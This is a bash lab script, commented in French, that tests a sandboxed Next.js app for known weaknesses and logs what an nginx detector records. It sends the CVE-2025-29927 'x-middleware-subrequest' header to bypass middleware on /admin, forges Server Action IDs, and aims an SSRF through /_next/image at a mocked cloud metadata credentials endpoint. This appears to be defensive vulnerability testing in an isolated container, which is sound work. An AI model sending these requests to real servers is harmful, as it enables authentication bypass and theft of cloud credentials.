#!/bin/bash
# Exécuté DANS le conteneur (--network none). $1 = default | permissive. Marqueurs seulement, corps inertes.
set -u
V=$(node -p 'require("next/package.json").version')
ip addr add 169.254.169.254/32 dev lo
mkdir -p /imds/latest/meta-data/iam/security-credentials && echo -n lab-role > /imds/latest/meta-data/iam/security-credentials/index.html
(cd /imds && python3 -m http.server 80 --bind 169.254.169.254 >/tmp/imds.log 2>&1 &)
nginx; LAB_IMAGES=$1 npx next start -H 127.0.0.1 -p 3000 >/tmp/next.log 2>&1 &
for i in $(seq 40); do curl -s -o /dev/null 127.0.0.1:3000 && break; sleep 1; done
B=http://127.0.0.1:8080; out(){ printf '%-8s %-11s %-34s %s\n' "$V" "$1" "$2" "$3"; }
if [ "$1" = default ]; then
  AID=$(curl -s $B/form | grep -o '\$ACTION_ID_[0-9a-f]*' | head -1 | sed 's/\$ACTION_ID_//')
  MAN=$(python3 -c 'import json;m=json.load(open(".next/server/server-reference-manifest.json"));print(" ".join(m.get("node",{}).keys()))' 2>/dev/null)
  out "$1" "id d'action (html)" "$AID (${#AID} car.)"
  out "$1" "id d'action (manifeste)" "${MAN:-introuvable}"
  c=$(curl -s -o /tmp/b -w '%{http_code}' -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' $B/admin); grep -q ADMIN-SECRET /tmp/b && r="CONTOURNÉ" || r="bloqué"; out "$1" "29927 valeur x5" "$c $r"
  c=$(curl -s -o /dev/null -w '%{http_code}' -H 'x-middleware-subrequest: middleware' $B/admin); out "$1" "29927 valeur x1" "$c"
  BODY=$'--bissa_cve_boundary\r\nContent-Disposition: form-data; name="a"\r\n\r\n1\r\n--bissa_cve_boundary--\r\n'
  FAKE=$(head -c 21 /dev/urandom | od -An -tx1 | tr -d ' \n')
  for id in x "$FAKE" "$AID"; do
    c=$(curl -s -o /tmp/b -w '%{http_code}' -X POST -H "Next-Action: $id" -H 'Content-Type: multipart/form-data; boundary=bissa_cve_boundary' --data-binary "$BODY" $B/form)
    lbl="Next-Action ${id:0:6}… (${#id} car.)"; [ "$id" = "$AID" ] && lbl="$lbl réel"; [ "$id" = "$FAKE" ] && lbl="$lbl faux"
    out "$1" "$lbl" "$c $(head -c 70 /tmp/b | tr -d '\n')"
  done
fi
U="$B/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75"
c=$(curl -s -o /tmp/b -w '%{http_code}' "$U"); out "$1" "SSRF image" "$c $(head -c 60 /tmp/b) | IMDS: $(grep -c 'GET /latest' /tmp/imds.log) req."
sleep 1
grep -h -i -E "valid image|private|local ip|action|error" /tmp/next.log | grep -v -E "^\s*$" | head -4 | sed "s/^/$V $1 next.log: /"
cat /var/log/nginx/detect.json | sed "s/^/$V $1 nginx: /"
